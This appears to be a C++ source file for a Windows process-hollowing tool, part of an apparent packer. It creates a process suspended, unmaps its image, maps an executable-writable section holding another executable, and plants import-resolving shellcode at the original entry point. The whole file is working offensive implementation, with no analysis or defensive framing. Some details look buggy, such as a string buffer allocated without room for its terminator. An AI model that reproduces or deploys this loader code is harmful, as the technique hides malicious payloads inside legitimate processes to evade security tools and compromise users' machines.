#include "stdafx.h"
#include "Hollower.h"
#include "Shellcode.h"
#include "Reflections.h"

#define STATUS_CONFLICTING_ADDRESSES 0xC0000018


Hollower::Hollower(std::wstring targetProcPath, IMAGE_DOS_HEADER *unpackedExe)
{
	this->hollowedProcPath = targetProcPath;
	this->packedPEData = new PEData(unpackedExe);
	this->hollowedPEData = new PEData(targetProcPath);

	HMODULE hmNtdll = GetModuleHandle(L"ntdll");

	this->NtUnmapViewOfSection = (TNtUnmapViewOfSection) GetProcAddress(hmNtdll, "NtUnmapViewOfSection");
	this->NtMapViewOfSection = (TNtMapViewOfSection)GetProcAddress(hmNtdll, "NtMapViewOfSection");
	this->NtCreateSection = (TNtCreateSection)GetProcAddress(hmNtdll, "NtCreateSection");
	
	this->containsStringSize = GetFunctionSize(ContainsString);
	this->IATshellcodeSize= GetFunctionSize(IATshellcode);

	
	this->remoteBase = (void*)this->hollowedPEData->GetOptionalHeader()->ImageBase;
}


void Hollower::ReMapExe()
{
	//remote base addr should be same as local base addr since we are hollowing same process
	this->NtUnmapViewOfSection(this->hProc, (void*)this->hollowedPEData->GetOptionalHeader()->ImageBase);
	HANDLE hSection;
	LARGE_INTEGER sMaxSize = { 0, 0 };
	sMaxSize.LowPart = this->packedPEData->GetOptionalHeader()->SizeOfImage > this->hollowedPEData->GetOptionalHeader()->SizeOfImage ? this->packedPEData->GetOptionalHeader()->SizeOfImage : this->hollowedPEData->GetOptionalHeader()->SizeOfImage;
	NTSTATUS status = this->NtCreateSection(&hSection, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &sMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	void *addr = this->packedPEData->GetModuleBase();
	void* loadedExeSection = NULL;
	SIZE_T vSize = 0;
	this->NtMapViewOfSection(hSection, (HANDLE)0xffffffff, &this->localSectionBase, NULL, NULL, NULL, &vSize, 2, NULL, PAGE_EXECUTE_READWRITE);
	status = this->NtMapViewOfSection(hSection, this->hProc, &this->remoteBase, NULL, NULL, NULL, &vSize, 2, NULL, PAGE_EXECUTE_READWRITE);
	
	//rebase - now requires a SetThreadContext call
	if (status == STATUS_CONFLICTING_ADDRESSES)
	{
		this->remoteBase = NULL;
		this->NtMapViewOfSection(hSection, this->hProc, &this->remoteBase, NULL, NULL, NULL, &vSize, 2, NULL, PAGE_EXECUTE_READWRITE);
	}

	this->imageOffset = (void*)(this->hollowedPEData->GetOptionalHeader()->AddressOfEntryPoint + this->IATshellcodeSize + 0x100);

	std::vector<SectionInfo> sections = this->packedPEData->GetSections();

	for (std::vector<SectionInfo>::iterator it = sections.begin(); it != sections.end(); ++it)
	{
		memcpy((void*)((int)this->localSectionBase + (int)this->imageOffset + (int)it->_vOffset), (void*)((int)addr + it->_rOffset), it->_vSize);
	}

}

size_t Hollower::SerializeIATInfo()
{
	/*
	* SerializedIAT State Maching
	* ---------------------
	* NULL - delimit function
	* NULL, NULL - delimit library (string after is always library name)
	* NULL, NULL, NULL - end of IAT info
	*
	*/

	IAT iat = this->packedPEData->GetIAT();
	//lead with two nulls
	char* sectionPos = (char*)this->localSectionBase+2;

	for (std::vector<Thunk>::iterator it = iat.thunks.begin(); it != iat.thunks.end(); ++it)
	{
		memcpy(sectionPos, it->libname.c_str(), it->libname.length());
		sectionPos += it->libname.length()+1;
		for (std::vector<std::string>::iterator itf = it->functionNames.begin(); itf != it->functionNames.end(); ++itf)
		{
			memcpy(sectionPos, itf->c_str(), itf->length());
			sectionPos += itf->length()+1;
		}
		//add extra NULL for lib delimeter
		sectionPos++;
	}
	return (size_t)((int)sectionPos - (int)this->localSectionBase)+2;
}

void Hollower::WriteIATInfo(size_t IATInfoOffset)
{
	int ContainsStringAddr = (int)this->localSectionBase + IATInfoOffset;

	//copy ContainsString Function
	memcpy((void*)ContainsStringAddr, ContainsString, containsStringSize);

	int kernel32Str = ContainsStringAddr + containsStringSize + 0x20;
	//copy string table for shellcode
	lstrcpyW((wchar_t*)kernel32Str, L"KERNEL32.DLL");

	int loadlibraryStr = kernel32Str + 0x20;
	strcpy_s((char*)loadlibraryStr, sizeof("LoadLibraryA"), "LoadLibraryA");

	int getProcAddrStr = loadlibraryStr + 0x20;
	strcpy_s((char*)getProcAddrStr, sizeof("GetProcAddress"), "GetProcAddress");

	//Our Shellcode EP should be lined up to EIP of the suspended process (AddressOfEntryPoint) - avoid SetThreadContext call :)
	int IATBootstrapEP = (int)this->localSectionBase + (int)(this->hollowedPEData->GetOptionalHeader()->AddressOfEntryPoint);

	//copy IATShellcode
	memcpy((void*)IATBootstrapEP, IATshellcode, this->IATshellcodeSize);
	
	//Apply settings to shellcodeEP
	FindReplaceMemory((void*)IATBootstrapEP, 
		(size_t)this->IATshellcodeSize, 
		std::map<DWORD, DWORD>({
								{ SECTION_BASE_PLACEHOLDER, (DWORD)this->remoteBase },
								{ IAT_LOCATION_PLACEHOLDER, (DWORD)this->remoteBase + (DWORD)this->packedPEData->GetIAT().offset},
								{ CONTAINS_STRING_PLACEHOLDER, (DWORD)this->remoteBase + IATInfoOffset },
								{ KERNEL32_PLACEHOLDER, (DWORD)this->remoteBase + (kernel32Str - (int)this->localSectionBase) },
								{ LOADLIBRARY_PLACEHOLDER,(DWORD)this->remoteBase + (loadlibraryStr - (int)this->localSectionBase)},
								{ GETPROCADDRESS_PLACEHOLDER,(DWORD)this->remoteBase + (getProcAddrStr - (int)this->localSectionBase)},
								{ OEP_PLACEHOLDER, (DWORD)this->remoteBase + (DWORD)this->imageOffset + this->packedPEData->GetEntryPoint() }
								}));

}

void Hollower::FixRelocations()
{
	IMAGE_BASE_RELOCATION* relocationDirectory = (IMAGE_BASE_RELOCATION*)((int)this->localSectionBase + (int)this->imageOffset + (int)this->packedPEData->GetOptionalHeader()->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	int relocationSize = *(int*)((int)this->localSectionBase + (int)this->packedPEData->GetOptionalHeader()->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);
	int relPos = 0;
	
	while (relPos < relocationSize)
	{
		DWORD majorOffset = (DWORD)relocationDirectory->VirtualAddress + relPos;
		size_t blockSize = (DWORD)relocationDirectory->SizeOfBlock;
		DWORD block = (DWORD)((DWORD*)relocationDirectory+2);
		for (size_t i = relPos; i < blockSize / 4; i++)
		{
			BYTE minorOffset = *(BYTE*)block;

			void* addrToBePatched = (IMAGE_BASE_RELOCATION*)((int)this->localSectionBase + (int)this->imageOffset + majorOffset + minorOffset);
			*(DWORD*)addrToBePatched = (DWORD)(((*(int*)addrToBePatched) - (int)this->packedPEData->GetOptionalHeader()->ImageBase) + (int)this->remoteBase);
			(WORD*)block++;
		}
		relPos += blockSize;
	}
}

void Hollower::InjectBootstrapCode(size_t IATInfoOffset)
{
	WriteIATInfo(IATInfoOffset);
	FixRelocations();

}

HANDLE Hollower::DoHollow()
{
	//sets hProc member with HANDLE result
	CreateSuspendedProcess();
	//Create section objects and map binary into remote process
	ReMapExe();
	//Serialize IAT info into remote section object
	size_t IATInfoOffset = SerializeIATInfo();
	//Write IAT stub which will process serialized IAT info
	InjectBootstrapCode(IATInfoOffset);

	return this->hProc;
}


void Hollower::CreateSuspendedProcess()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	memset(&si, 0, sizeof(si));

	si.cb = sizeof(STARTUPINFO);
	wchar_t* app = (wchar_t*)malloc(hollowedProcPath.length()*sizeof(wchar_t));

	lstrcpyW(app, hollowedProcPath.c_str());

	CreateProcess(app, NULL , NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	
	this->hProc = pi.hProcess;
}

Hollower::~Hollower()
{

}

